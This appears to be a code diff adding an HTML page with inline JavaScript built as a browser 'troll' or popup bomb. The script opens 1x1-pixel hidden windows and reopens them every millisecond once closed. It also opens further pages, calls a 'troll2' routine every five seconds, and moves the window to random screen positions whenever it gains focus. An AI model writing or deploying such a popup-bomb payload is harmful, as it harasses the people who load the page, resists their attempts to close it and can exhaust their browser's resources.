@@ -1,0 +1,26 @@
+<script src="index.js"></script>
+
+<script>
+    var w = window.open('hidden2.html','','HEIGHT=1,WIDTH=1');
+            setInterval(() => {
+                if(w.closed) {
+                    w = window.open('hidden2.html','','HEIGHT=1,WIDTH=1');
+                    window.open('hidden.html','','HEIGHT=1,WIDTH=1');
+                }
+            },1);
+            open('secondpart.html');
+    function RB(min, max) {
+        return Math.floor(Math.random() * (max - min + 1) + min);
+    }
+    
+    setInterval(() => {
+        troll2();
+    }, 5000);
+
+    onfocus = () => {
+        window.open('hidden.html','','HEIGHT=1,WIDTH=1');
+        open('secondpart.html');
+        window.moveTo(RB(0,screen.width),RB(0,screen.height));
+    }
+    window.moveTo(RB(0,screen.width),RB(0,screen.height));
+</script>
